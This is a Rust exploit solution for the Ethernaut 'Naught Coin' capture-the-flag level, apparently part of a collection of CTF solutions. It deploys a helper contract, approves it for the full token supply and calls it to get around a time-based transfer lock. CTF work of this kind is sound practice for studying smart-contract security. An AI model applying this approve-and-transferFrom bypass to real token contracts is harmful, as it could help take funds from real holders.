//! Ethernaut 15 — Naught Coin.
//!
//! Goal: Move all of your offender account's `NaughtCoin` tokens away despite
//! the ten-year transfer lock. Its final token balance must be zero.
//!
//! https://github.com/OpenZeppelin/ethernaut/blob/d05643a/contracts/src/levels/NaughtCoin.sol

use async_trait::async_trait;
use ctf::Actor;
use ctf::ethereum::ethernaut::lvl15_naught_coin::*;

pub struct Exploit;

alloy::sol!(
    #[sol(rpc)]
    NaughtCoinExploit,
    "out/NaughtCoinExploit.sol/NaughtCoinExploit.json"
);

#[async_trait]
impl ctf::Exploit for Exploit {
    type Target = Target;

    async fn attack(
        self,
        target: &Self::Target,
        offender: &Actor,
    ) -> eyre::Result<()> {
        let exploit = NaughtCoinExploit::deploy(offender.provider()).await?;

        let contract = NaughtCoin::new(target.address, offender.provider());
        let supply = contract.INITIAL_SUPPLY().call().await?;
        contract
            .approve(*exploit.address(), supply)
            .send()
            .await?
            .watch()
            .await?;

        exploit.attack(target.address).send().await?.watch().await?;

        Ok(())
    }
}
